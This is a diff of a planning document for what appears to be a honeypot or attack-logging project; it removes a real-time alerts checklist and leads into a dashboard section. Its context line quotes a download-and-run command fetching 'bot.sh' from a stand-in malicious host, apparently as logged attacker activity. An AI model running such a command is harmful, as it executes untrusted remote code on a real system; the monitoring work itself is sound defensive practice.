@@ -99,15 +99,6 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 ...
 ```
 
-### Real-time Alerts
-- [x] Webhook notifications (Slack, Discord, Teams)
-- [x] Threshold-based alerting (e.g., >100 attempts/hour)
-- [x] Alert on specific events:
-  - Malware downloads
-- [ ] Future enhancements:
-  - Successful logins
-  - Known attacker IPs (threat intel integration)
-
 ## Phase 2: Dashboard & Visualization
 
 ### Option 1: ELK Stack (Elasticsearch + Logstash + Kibana)
